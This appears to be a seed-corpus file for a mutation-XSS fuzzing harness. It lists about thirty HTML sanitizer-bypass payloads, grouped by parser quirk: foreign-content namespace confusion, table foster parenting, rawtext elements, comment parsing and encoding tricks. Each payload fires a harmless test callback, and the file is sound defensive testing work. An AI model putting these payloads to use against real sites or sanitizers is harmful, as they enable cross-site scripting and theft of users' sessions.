/* ============================================================================
 * corpus.js — seed corpus. canary:true seeds are armed (expect exec under the
 * right mutation); canary:false are divergence-class or inert controls.
 * Import packs: harness accepts additional JSON arrays of the same shape.
 * ========================================================================== */
"use strict";
const Corpus = { seeds: [
  {
    "id": "f-mglyph-1",
    "family": "foreign",
    "canary": true,
    "html": "<math><mtext><table><mglyph><style><!--</style><img title=\"--><img src=x onerror=__mxss.hit('f-mglyph-1')>\">"
  },
  {
    "id": "f-form-1",
    "family": "foreign",
    "canary": true,
    "html": "<form><math><mtext></form><form><mglyph><style></math><img src onerror=__mxss.hit('f-form-1')>"
  },
  {
    "id": "f-anno-1",
    "family": "foreign",
    "canary": true,
    "html": "<math><annotation-xml encoding=\"text/html\"><svg><script>__mxss.hit('f-anno-1')</script>"
  },
  {
    "id": "f-svgstyle-1",
    "family": "foreign",
    "canary": true,
    "html": "<svg></p><style><g title=\"</style><img src onerror=__mxss.hit('f-svgstyle-1')>\">"
  },
  {
    "id": "f-desc-1",
    "family": "foreign",
    "canary": true,
    "html": "<svg><desc><table><style><img src=x onerror=__mxss.hit('f-desc-1')>"
  },
  {
    "id": "fo-table-1",
    "family": "foster",
    "canary": true,
    "html": "<table><td><svg><desc><table><style><img src=x onerror=__mxss.hit('fo-table-1')>"
  },
  {
    "id": "fo-text-1",
    "family": "foster",
    "canary": true,
    "html": "<table>stray<style><img src=x onerror=__mxss.hit('fo-text-1')></table>"
  },
  {
    "id": "fo-caption",
    "family": "foster",
    "canary": true,
    "html": "<table><caption><table><img src=x onerror=__mxss.hit('fo-caption')>"
  },
  {
    "id": "r-style-live",
    "family": "rawtext",
    "canary": true,
    "html": "<style></style><img src=x onerror=__mxss.hit('r-style-live')>"
  },
  {
    "id": "r-style-inert",
    "family": "rawtext",
    "canary": false,
    "html": "<style><img src=x onerror=__mxss.hit('r-style-inert')>"
  },
  {
    "id": "r-xmp-live",
    "family": "rawtext",
    "canary": true,
    "html": "<xmp></xmp><img src=x onerror=__mxss.hit('r-xmp-live')>"
  },
  {
    "id": "r-noscript",
    "family": "rawtext",
    "canary": false,
    "html": "<noscript><p title=\"</noscript><img src=x onerror=__mxss.hit('r-noscript')>\">"
  },
  {
    "id": "r-plaintext",
    "family": "rawtext",
    "canary": false,
    "html": "<div><plaintext><img src=x onerror=__mxss.hit('r-plaintext')>"
  },
  {
    "id": "r-title-rcdata",
    "family": "rawtext",
    "canary": false,
    "html": "<title>&lt;img src=x onerror=__mxss.hit('r-title-rcdata')&gt;</title>"
  },
  {
    "id": "a-cross-1",
    "family": "adoption",
    "canary": true,
    "html": "<b><i><img src=x onerror=__mxss.hit('a-cross-1')></b></i>"
  },
  {
    "id": "a-aaa-1",
    "family": "adoption",
    "canary": false,
    "html": "<a href=#><div><a href=# onclick=__mxss.hit('a-aaa-1')>x"
  },
  {
    "id": "a-nobr",
    "family": "adoption",
    "canary": true,
    "html": "<nobr><div></nobr><nobr><img src=x onerror=__mxss.hit('a-nobr')>"
  },
  {
    "id": "a-nest3",
    "family": "adoption",
    "canary": true,
    "html": "<b><b><b><img src=x onerror=__mxss.hit('a-nest3')></b>"
  },
  {
    "id": "t-tpl-table",
    "family": "template",
    "canary": false,
    "html": "<table><template><tr><td><svg><script>__mxss.hit('t-tpl-table')</script>"
  },
  {
    "id": "t-nested",
    "family": "template",
    "canary": false,
    "html": "<template><template><img src=x onerror=__mxss.hit('t-nested')></template>"
  },
  {
    "id": "c-abrupt",
    "family": "comment",
    "canary": true,
    "html": "<!--><img src=x onerror=__mxss.hit('c-abrupt')>-->"
  },
  {
    "id": "c-bogus",
    "family": "comment",
    "canary": false,
    "html": "<? <img src=x onerror=__mxss.hit('c-bogus')> >"
  },
  {
    "id": "c-nested",
    "family": "comment",
    "canary": true,
    "html": "<!-- <!-- --> <img src=x onerror=__mxss.hit('c-nested')> -->"
  },
  {
    "id": "s-select-live",
    "family": "select",
    "canary": true,
    "html": "<select><style></select><img src=x onerror=__mxss.hit('s-select-live')>"
  },
  {
    "id": "s-select-inert",
    "family": "select",
    "canary": false,
    "html": "<select><img src=x onerror=__mxss.hit('s-select-inert')></select>"
  },
  {
    "id": "fm-nested",
    "family": "form",
    "canary": true,
    "html": "<form><form><img src=x onerror=__mxss.hit('fm-nested')>"
  },
  {
    "id": "fm-jsaction",
    "family": "form",
    "canary": false,
    "html": "<form id=fz><button form=fz formaction=\"javascript:__mxss.hit('fm-jsaction')\">go</button>"
  },
  {
    "id": "e-newline",
    "family": "encoding",
    "canary": true,
    "html": "<img src=x onerror=__mxss.hit&NewLine;('e-newline')>"
  },
  {
    "id": "e-null",
    "family": "encoding",
    "canary": true,
    "html": "<img src=x onerror=\"__mxss.hit('e-null')\u0000\">"
  },
  {
    "id": "e-dup",
    "family": "encoding",
    "canary": true,
    "html": "<img src=x src=y onerror=__mxss.hit('e-dup')>"
  },
  {
    "id": "e-utf7",
    "family": "encoding",
    "canary": false,
    "html": "+ADw-img src=x onerror=__mxss.hit('e-utf7')+AD4-"
  },
  {
    "id": "i-srcdoc",
    "family": "template",
    "canary": true,
    "html": "<iframe srcdoc=\"&lt;img src=x onerror=&quot;top.postMessage({t:'mxss_exec',id:'i-srcdoc'},'*')&quot;&gt;\"></iframe>"
  },
  {
    "id": "z-benign-1",
    "family": "control",
    "canary": false,
    "html": "<p>hello <b>world</b></p>"
  },
  {
    "id": "z-benign-2",
    "family": "control",
    "canary": false,
    "html": "<div data-x=\"1\">plain text</div>"
  }
] };
if (typeof module !== "undefined") module.exports = Corpus;
